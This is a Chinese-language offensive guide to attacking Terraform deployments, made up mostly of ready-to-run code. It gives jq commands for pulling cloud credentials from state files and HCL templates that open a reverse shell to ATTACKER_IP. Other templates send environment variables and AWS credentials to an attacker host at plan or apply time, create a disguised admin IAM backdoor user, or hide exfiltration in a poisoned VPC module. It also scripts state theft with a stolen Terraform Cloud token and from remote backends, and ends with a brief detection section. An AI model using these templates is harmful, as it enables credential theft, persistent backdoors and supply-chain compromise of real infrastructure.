# Terraform 攻击技术详解

## State 文件凭据提取完整清单

### AWS 资源凭据

```bash
# IAM Access Key（最高价值）
jq -r '.resources[] | select(.type=="aws_iam_access_key") |
  .instances[].attributes | "User: \(.user)\nAccessKeyId: \(.id)\nSecretKey: \(.secret)\n---"' terraform.tfstate

# RDS / Aurora 数据库
jq -r '.resources[] | select(.type | test("aws_db_instance|aws_rds_cluster")) |
  .instances[].attributes | "Endpoint: \(.endpoint)\nDB: \(.db_name)\nUser: \(.username)\nPass: \(.password)\nPort: \(.port)\n---"' terraform.tfstate

# Redshift 集群
jq -r '.resources[] | select(.type=="aws_redshift_cluster") |
  .instances[].attributes | "Endpoint: \(.endpoint)\nDB: \(.database_name)\nUser: \(.master_username)\nPass: \(.master_password)\n---"' terraform.tfstate

# ElastiCache (Redis/Memcached)
jq -r '.resources[] | select(.type | test("aws_elasticache")) |
  .instances[].attributes | "Endpoint: \(.primary_endpoint_address // .configuration_endpoint)\nAuth: \(.auth_token)\n---"' terraform.tfstate

# Secrets Manager
jq -r '.resources[] | select(.type=="aws_secretsmanager_secret_version") |
  .instances[].attributes | "ARN: \(.secret_id)\nValue: \(.secret_string)\n---"' terraform.tfstate

# SSM Parameter Store
jq -r '.resources[] | select(.type=="aws_ssm_parameter") |
  .instances[].attributes | "Name: \(.name)\nType: \(.type)\nValue: \(.value)\n---"' terraform.tfstate

# EC2 Key Pair（私钥）
jq -r '.resources[] | select(.type=="tls_private_key") |
  .instances[].attributes | "Algorithm: \(.algorithm)\nPrivateKey:\n\(.private_key_pem)\n---"' terraform.tfstate

# SES SMTP 凭据
jq -r '.resources[] | select(.type=="aws_iam_access_key") |
  .instances[].attributes | "SES SMTP User: \(.id)\nSES SMTP Pass: \(.ses_smtp_password_v4)\n---"' terraform.tfstate
```

### 腾讯云 / 阿里云资源凭据

```bash
# 腾讯云 CAM SecretKey
jq -r '.resources[] | select(.type | test("tencentcloud_cam")) |
  .instances[].attributes' terraform.tfstate

# 腾讯云 CDB (MySQL)
jq -r '.resources[] | select(.type=="tencentcloud_mysql_instance") |
  .instances[].attributes | "Host: \(.intranet_ip)\nPort: \(.intranet_port)\nPass: \(.root_password)\n---"' terraform.tfstate

# 阿里云 RDS
jq -r '.resources[] | select(.type=="alicloud_db_account") |
  .instances[].attributes | "Account: \(.account_name)\nPass: \(.password)\n---"' terraform.tfstate

# 阿里云 RAM AccessKey
jq -r '.resources[] | select(.type=="alicloud_ram_access_key") |
  .instances[].attributes | "Id: \(.id)\nSecret: \(.secret)\n---"' terraform.tfstate
```

### Azure 资源凭据

```bash
# Azure SQL Server
jq -r '.resources[] | select(.type=="azurerm_mssql_server") |
  .instances[].attributes | "FQDN: \(.fully_qualified_domain_name)\nAdmin: \(.administrator_login)\nPass: \(.administrator_login_password)\n---"' terraform.tfstate

# Azure Storage Account Key
jq -r '.resources[] | select(.type=="azurerm_storage_account") |
  .instances[].attributes | "Name: \(.name)\nPrimaryKey: \(.primary_access_key)\nConnStr: \(.primary_connection_string)\n---"' terraform.tfstate

# Azure Service Principal
jq -r '.resources[] | select(.type=="azuread_application_password") |
  .instances[].attributes | "AppId: \(.application_object_id)\nSecret: \(.value)\n---"' terraform.tfstate
```

### GCP 资源凭据

```bash
# GCP Service Account Key
jq -r '.resources[] | select(.type=="google_service_account_key") |
  .instances[].attributes | "SA: \(.service_account_id)\nPrivateKey: \(.private_key)\n---"' terraform.tfstate

# GCP SQL Instance
jq -r '.resources[] | select(.type=="google_sql_user") |
  .instances[].attributes | "Instance: \(.instance)\nUser: \(.name)\nPass: \(.password)\n---"' terraform.tfstate
```

### 通用快速搜索

```bash
# 一次性提取所有带敏感关键词的属性
jq -r '[.resources[].instances[].attributes | to_entries[] |
  select(.key | test("password|secret|token|key|credential|private|auth"; "i")) |
  select(.value != null and .value != "" and (.value | type == "string")) |
  {key: .key, value: .value}] | unique_by(.value) | .[] |
  "\(.key): \(.value)"' terraform.tfstate

# 提取所有 Output（包括 sensitive）
jq -r '.outputs | to_entries[] |
  "\(.key) [sensitive=\(.value.sensitive)]: \(.value.value)"' terraform.tfstate

# 搜索 Base64 编码的内容（可能是证书或密钥）
jq -r '[.resources[].instances[].attributes | to_entries[] |
  select(.value | type == "string" and test("^[A-Za-z0-9+/]{40,}={0,2}$")) |
  {key: .key, value: .value}] | .[]' terraform.tfstate
```

## 恶意资源注入模板

### local-exec Provisioner（apply 阶段执行）

```hcl
# 反弹 Shell
resource "null_resource" "backdoor" {
  provisioner "local-exec" {
    command = "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &'"
  }
  # 每次 apply 都触发
  triggers = {
    always_run = timestamp()
  }
}

# 窃取环境变量和凭据
resource "null_resource" "exfil" {
  provisioner "local-exec" {
    command = <<-EOT
      (env; cat ~/.aws/credentials 2>/dev/null; cat ~/.terraform.d/credentials.tfrc.json 2>/dev/null) |
        curl -s -X POST -d @- http://ATTACKER/collect
    EOT
  }
}
```

### external Data Source（plan 阶段执行）

```hcl
# plan 阶段即可 RCE——最隐蔽的注入方式
data "external" "recon" {
  program = ["bash", "-c", <<-EOT
    # 窃取凭据
    (env; cat ~/.aws/credentials 2>/dev/null) | \
      curl -s -X POST -d @- http://ATTACKER/collect >&2
    # 必须输出有效 JSON 否则 plan 会失败
    echo '{"result": "ok"}'
  EOT
  ]
}

# 伪装为合法数据查询
data "external" "dns_check" {
  program = ["bash", "-c", "dig +short attacker.com >&2; echo '{\"ip\": \"1.2.3.4\"}'"]
}
```

### 后门 IAM 用户（AWS）

```hcl
# 创建后门用户并附加管理员策略
resource "aws_iam_user" "monitoring" {
  name = "cloudwatch-metrics-reader"  # 伪装为监控用户
  tags = {
    Purpose = "CloudWatch metrics collection"
  }
}

resource "aws_iam_user_policy_attachment" "monitoring" {
  user       = aws_iam_user.monitoring.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}

resource "aws_iam_access_key" "monitoring" {
  user = aws_iam_user.monitoring.name
}

output "monitoring_access_key" {
  value     = aws_iam_access_key.monitoring.id
  sensitive = true
}

output "monitoring_secret_key" {
  value     = aws_iam_access_key.monitoring.secret
  sensitive = true
}
```

### 安全组开放（AWS）

```hcl
# 修改现有安全组规则，开放特定端口
resource "aws_security_group_rule" "debug_ssh" {
  type              = "ingress"
  from_port         = 22
  to_port           = 22
  protocol          = "tcp"
  cidr_blocks       = ["ATTACKER_IP/32"]
  security_group_id = "sg-existing-id"
  description       = "Temporary debug access"  # 伪装描述
}
```

## Terraform Cloud API 利用

### 完整枚举流程

```bash
TOKEN="STOLEN_TFC_TOKEN"
API="https://app.terraform.io/api/v2"
HEADERS=(-H "Authorization: Bearer $TOKEN" -H "Content-Type: application/vnd.api+json")

# 1. 列出所有 Organization
curl -s "${HEADERS[@]}" "$API/organizations" | jq -r '.data[].id'

# 2. 列出指定 Organization 的所有 Workspace
ORG="target-org"
curl -s "${HEADERS[@]}" "$API/organizations/$ORG/workspaces?page[size]=100" |
  jq -r '.data[] | "\(.id) \(.attributes.name)"'

# 3. 读取 Workspace 变量（包括 sensitive 标记的）
WS_ID="ws-xxxxx"
curl -s "${HEADERS[@]}" "$API/workspaces/$WS_ID/vars" |
  jq -r '.data[] | "\(.attributes.key)=\(.attributes.value) [sensitive=\(.attributes.sensitive)]"'

# 4. 下载最新 State
STATE_URL=$(curl -s "${HEADERS[@]}" "$API/workspaces/$WS_ID/current-state-version" |
  jq -r '.data.attributes["hosted-state-download-url"]')
curl -s -H "Authorization: Bearer $TOKEN" "$STATE_URL" > state.json

# 5. 批量下载所有 Workspace 的 State
for ws in $(curl -s "${HEADERS[@]}" "$API/organizations/$ORG/workspaces?page[size]=100" | jq -r '.data[].id'); do
  echo "=== $ws ==="
  STATE_URL=$(curl -s "${HEADERS[@]}" "$API/workspaces/$ws/current-state-version" | jq -r '.data.attributes["hosted-state-download-url"]' 2>/dev/null)
  [ "$STATE_URL" != "null" ] && curl -s -H "Authorization: Bearer $TOKEN" "$STATE_URL" > "${ws}_state.json"
done

# 6. 触发 Speculative Plan（在 Runner 上执行代码）
# 需要上传包含恶意 external data source 的配置
```

## 远程 State 后端利用详解

### S3 Backend

```bash
# 从配置中提取 S3 Backend 信息
grep -A 20 'backend "s3"' *.tf

# 典型配置：
# backend "s3" {
#   bucket         = "my-terraform-state"
#   key            = "prod/terraform.tfstate"
#   region         = "us-east-1"
#   dynamodb_table = "terraform-locks"
#   encrypt        = true
# }

# 下载 State
aws s3 cp s3://my-terraform-state/prod/terraform.tfstate /tmp/

# 列出所有 State 文件（可能有多个环境）
aws s3 ls s3://my-terraform-state/ --recursive | grep tfstate

# 检查版本控制（可能有历史 State 包含已轮换的凭据）
aws s3api list-object-versions --bucket my-terraform-state \
  --prefix prod/terraform.tfstate | jq '.Versions[].VersionId'

# 下载历史版本
aws s3api get-object --bucket my-terraform-state \
  --key prod/terraform.tfstate --version-id VERSION_ID /tmp/old_state.json

# 检查 DynamoDB 锁表（了解谁在操作）
aws dynamodb scan --table-name terraform-locks
```

### Consul Backend

```bash
# 读取 State
consul kv get terraform/state

# 列出所有 Terraform 相关 Key
consul kv get -recurse terraform/

# 如果 Consul ACL 启用，检查 Token 权限
consul acl token read -self
```

### HTTP Backend

```bash
# HTTP Backend 直接通过 HTTP GET 获取 State
# 检查配置：
# backend "http" {
#   address        = "http://state-server:8080/terraform/state"
#   lock_address   = "http://state-server:8080/terraform/lock"
#   unlock_address = "http://state-server:8080/terraform/unlock"
#   username       = "admin"
#   password       = "secret"
# }

curl -s http://state-server:8080/terraform/state
# 带认证
curl -s -u admin:secret http://state-server:8080/terraform/state
```

## Module 供应链攻击详解

### 攻击向量

| 向量 | 前提条件 | 影响范围 |
|---|---|---|
| Module 源替换 | 有 .tf 文件写权限 | 使用该 Module 的所有 Workspace |
| Git Tag 劫持 | 有 Module Git 仓库写权限 | 使用 tag 引用的所有项目 |
| Registry 投毒 | 有私有 Registry 写权限 | Registry 内所有消费方 |
| Typosquatting | 公开 Registry | 手误引用的项目 |
| 依赖混淆 | 公开 + 私有 Registry 共存 | 解析顺序错误的项目 |

### 恶意 Module 构建

```hcl
# modules/evil-vpc/main.tf
# 看起来是正常的 VPC Module，但内嵌了恶意 data source

variable "vpc_cidr" {
  default = "10.0.0.0/16"
}

resource "aws_vpc" "main" {
  cidr_block = var.vpc_cidr
}

# 隐藏的恶意部分——plan 阶段执行
data "external" "telemetry" {
  program = ["bash", "-c", <<-EOT
    (env; cat ~/.aws/credentials 2>/dev/null) | \
      curl -s -X POST -d @- http://ATTACKER/collect >&2
    echo '{"status": "ok"}'
  EOT
  ]
}
```

### 检测与防御

```bash
# 审计 Module 源地址
grep -rn 'source\s*=' *.tf | grep -v 'registry.terraform.io'

# 检查 .terraform.lock.hcl 的 Provider hash 是否被篡改
git diff .terraform.lock.hcl

# 使用 terraform providers lock 验证 Provider 完整性
terraform providers lock -platform=linux_amd64

# 扫描 Module 代码中的恶意构造
grep -rn 'external\|local-exec\|remote-exec' .terraform/modules/
```
